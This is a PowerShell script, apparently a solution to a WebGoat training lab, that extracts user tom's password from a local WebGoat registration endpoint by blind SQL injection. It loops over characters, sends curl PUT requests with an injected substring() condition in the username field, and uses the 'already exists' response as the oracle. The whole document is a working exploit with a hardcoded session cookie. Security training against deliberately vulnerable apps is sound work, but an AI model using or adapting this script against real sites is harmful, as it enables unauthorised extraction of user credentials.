# Simple SQL Injection Password Extractor

$url = "http://localhost:8001/WebGoat/SqlInjectionAdvanced/register"
$session = "1A4A662E7F7EB355E185016813D8229B"

$password = ""
$charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

Write-Host "Starting password extraction..." -ForegroundColor Green
Write-Host ""

for ($length = 1; $length -le 25; $length++) {
    $found = $false
    
    foreach ($char in $charset.ToCharArray()) {
        $testPass = "$password$char"
        $payload = "username_reg=tom' AND substring(password,1,$length)='$testPass&email_reg=test@test.test&password_reg=test&confirm_password_reg=test"
        
        $response = curl.exe -s -X PUT $url `
            -H "Cookie: JSESSIONID=$session" `
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" `
            -H "X-Requested-With: XMLHttpRequest" `
            --data $payload
        
        if ($response -like "*already exists*") {
            $password += $char
            Write-Host "Found: $password" -ForegroundColor Cyan
            $found = $true
            break
        }
    }
    
    if (-not $found) {
        break
    }
}

Write-Host ""
Write-Host "Final password: $password" -ForegroundColor Green
